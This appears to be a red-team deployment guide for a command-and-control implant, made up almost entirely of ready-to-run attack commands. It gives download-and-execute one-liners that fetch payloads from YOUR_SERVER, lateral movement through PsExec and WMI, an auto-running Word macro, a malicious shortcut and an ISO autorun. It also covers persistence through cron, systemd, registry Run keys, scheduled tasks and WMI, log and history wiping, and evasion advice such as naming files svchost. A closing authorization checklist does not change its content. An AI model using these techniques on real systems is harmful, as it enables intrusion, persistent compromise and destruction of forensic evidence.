# Agent Deployment Guide

## 📦 Deployment Methods for Real Red Team Engagements

### Table of Contents
1. [Local Execution](#local-execution)
2. [Remote Execution](#remote-execution)
3. [Web-Based Delivery](#web-based-delivery)
4. [Social Engineering](#social-engineering)
5. [Persistence Mechanisms](#persistence-mechanisms)
6. [Cleanup Procedures](#cleanup-procedures)

---

## 🖥️ Local Execution

### Python Agent - Linux/Mac

```bash
# Method 1: Direct execution
python3 -c "$(curl -fsSL http://YOUR_SERVER/agent.py)"

# Method 2: Background execution with nohup
nohup python3 agent.py > /dev/null 2>&1 &

# Method 3: Using screen session
screen -dmS update python3 agent.py

# Method 4: Inline base64
echo "BASE64_ENCODED_AGENT" | base64 -d | python3
```

### Python Agent - Windows

```powershell
# Method 1: Direct execution
python agent.py

# Method 2: Hidden window
pythonw agent.py

# Method 3: Background with Start-Process
Start-Process python -ArgumentList "agent.py" -WindowStyle Hidden
```

### PowerShell Agent - Windows

```powershell
# Method 1: Bypass execution policy
powershell -ExecutionPolicy Bypass -File agent.ps1

# Method 2: Hidden window
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File agent.ps1

# Method 3: No profile, no exit
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File agent.ps1

# Method 4: Encoded command
$command = Get-Content agent.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

---

## 🌐 Remote Execution

### SSH/RDP Lateral Movement

**SSH (Linux)**:
```bash
# Copy and execute
scp agent.py user@target:/tmp/update.py
ssh user@target "python3 /tmp/update.py"

# One-liner
ssh user@target "python3 -c \"\$(curl -fsSL http://YOUR_SERVER/agent.py)\""
```

**RDP/SMB (Windows)**:
```powershell
# Copy via SMB
Copy-Item agent.ps1 \\TARGET\C$\Windows\Temp\update.ps1

# Execute via PSExec
psexec.exe \\TARGET -u user -p pass cmd /c "powershell -ep bypass C:\Windows\Temp\update.ps1"

# Execute via WMI
wmic /node:TARGET /user:user /password:pass process call create "powershell -ep bypass C:\Windows\Temp\update.ps1"
```

### PowerShell Remoting

```powershell
# Enable remoting (if needed)
Enable-PSRemoting -Force

# Execute on remote system
Invoke-Command -ComputerName TARGET -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/agent.ps1')
}

# With credentials
$cred = Get-Credential
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/agent.ps1')
}
```

---

## 🌍 Web-Based Delivery

### HTTP Download and Execute

**Python**:
```bash
# Using curl
curl -fsSL http://YOUR_SERVER/agent.py | python3

# Using wget
wget -qO- http://YOUR_SERVER/agent.py | python3

# Using Python urllib
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://YOUR_SERVER/agent.py').read())"
```

**PowerShell**:
```powershell
# IEX download
IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/agent.ps1')

# Invoke-WebRequest
Invoke-Expression (Invoke-WebRequest -Uri 'http://YOUR_SERVER/agent.ps1' -UseBasicParsing).Content

# Short form
iwr -useb http://YOUR_SERVER/agent.ps1 | iex
```

### HTTPS with Self-Signed Certificate

**Setup HTTPS Server**:
```bash
# Generate certificate
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

# Run HTTPS server
python3 << EOF
import http.server
import ssl

server_address = ('0.0.0.0', 443)
httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='server.pem')
httpd.serve_forever()
EOF
```

**Client Execution** (bypassing certificate validation):
```powershell
# PowerShell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('https://YOUR_SERVER/agent.ps1')
```

---

## 🎣 Social Engineering

### Malicious Document Macros

**Word/Excel VBA Macro**:
```vba
Sub AutoOpen()
    RunAgent
End Sub

Sub Document_Open()
    RunAgent
End Sub

Sub RunAgent()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    ' Download and execute PowerShell agent
    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/agent.ps1')""", 0, False
    
    Set shell = Nothing
End Sub
```

### LNK File (Windows Shortcut)

```powershell
# Create malicious shortcut
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\Document.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/agent.ps1')"""
$Shortcut.IconLocation = "C:\Windows\System32\imageres.dll,2"
$Shortcut.Save()
```

### ISO/IMG Files

```bash
# Create directory structure
mkdir payload_iso
cd payload_iso

# Add your agent
cp ../agent.py update.py

# Add autorun (Windows)
echo "[AutoRun]" > autorun.inf
echo "open=pythonw.exe update.py" >> autorun.inf
echo "icon=icon.ico" >> autorun.inf

# Create ISO
genisoimage -o ../payload.iso -J -R .
```

---

## 🔄 Persistence Mechanisms

### Linux Persistence

**Systemd Service**:
```bash
cat > /etc/systemd/system/update-service.service <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/update.py
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update-service
systemctl start update-service
```

**Cron Job**:
```bash
# Add to crontab
(crontab -l 2>/dev/null; echo "@reboot python3 /opt/update.py") | crontab -

# Or every 5 minutes
(crontab -l 2>/dev/null; echo "*/5 * * * * python3 /opt/update.py") | crontab -
```

**Bashrc Injection**:
```bash
echo "python3 /opt/update.py &" >> ~/.bashrc
```

### Windows Persistence

**Registry Run Key**:
```powershell
# Current User
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "pythonw.exe C:\Windows\Temp\update.py" -PropertyType String -Force

# Local Machine (requires admin)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "pythonw.exe C:\Windows\Temp\update.py" -PropertyType String -Force
```

**Scheduled Task**:
```powershell
# Run at startup
$action = New-ScheduledTaskAction -Execute "pythonw.exe" -Argument "C:\Windows\Temp\update.py"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -Description "Windows System Update"

# Run every hour
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -Description "Windows System Update"
```

**WMI Event Subscription**:
```powershell
# Filter for user logon
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    EventNamespace = 'root\cimv2'
    Name = 'SystemUpdateFilter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"
    QueryLanguage = 'WQL'
}

# Consumer to execute payload
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'SystemUpdateConsumer'
    CommandLineTemplate = 'pythonw.exe C:\Windows\Temp\update.py'
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---

## 🧹 Cleanup Procedures

### Remove Artifacts

**Linux**:
```bash
# Remove agent file
rm -f /opt/update.py /tmp/agent.py

# Clear bash history
history -c
rm ~/.bash_history
ln -s /dev/null ~/.bash_history

# Remove cron jobs
crontab -r

# Remove systemd service
systemctl stop update-service
systemctl disable update-service
rm /etc/systemd/system/update-service.service
systemctl daemon-reload

# Clear logs
> /var/log/auth.log
> /var/log/syslog
```

**Windows**:
```powershell
# Remove files
Remove-Item -Path "C:\Windows\Temp\update.py" -Force
Remove-Item -Path "C:\Windows\Temp\agent.ps1" -Force

# Remove registry keys
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue

# Remove scheduled tasks
Unregister-ScheduledTask -TaskName "SystemUpdate" -Confirm:$false

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear event logs (requires admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

### Verification

**Verify Cleanup**:
```bash
# Linux
ps aux | grep -i python
crontab -l
systemctl list-units | grep update
ls -la /tmp /opt

# Windows (PowerShell)
Get-Process | Where-Object {$_.ProcessName -like "*python*"}
Get-ScheduledTask | Where-Object {$_.TaskName -like "*update*"}
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

---

## 🔒 OpSec Best Practices

### File Naming
- Use system-like names: `update.py`, `svchost.py`, `system32.ps1`
- Match environment: `.bashrc`, `.profile`, `maintenance.py`
- Avoid obvious names: `backdoor.py`, `c2.ps1`, `agent.py`

### Network OpSec
- Use common ports: 80, 443, 8080, 8443
- Implement C2 domain fronting
- Add jitter to callbacks (random delays)
- Limit bandwidth usage

### Execution OpSec
- Run as non-privileged user when possible
- Use legitimate binaries (LOLBAS)
- Avoid spawning new processes
- Minimize disk writes

### Timing OpSec
- Avoid execution during monitoring hours
- Match normal user behavior patterns
- Use scheduled tasks aligned with legitimate updates
- Implement sleep/jitter between commands

---

## 📋 Pre-Deployment Checklist

Before deploying agents in a Red Team engagement:

- [ ] Written authorization obtained
- [ ] Scope clearly defined
- [ ] C2 infrastructure tested
- [ ] Backup C2 servers available
- [ ] Firewall rules configured
- [ ] Listener running and tested
- [ ] Agent tested in lab environment
- [ ] Cleanup procedures documented
- [ ] Communication plan established
- [ ] Legal review completed
- [ ] Emergency shutdown procedure ready

---

## ⚠️ Legal & Ethical Reminder

**NEVER deploy without authorization!**

This guide is for:
- Authorized penetration testing
- Red team exercises with permission
- Security research in controlled environments
- Educational purposes

Unauthorized deployment is illegal and unethical.

---

## 📞 Support

For deployment questions:
1. Review this guide thoroughly
2. Test in isolated lab first
3. Verify all prerequisites
4. Document any issues encountered

---

**Version**: 1.0  
**Last Updated**: February 2024
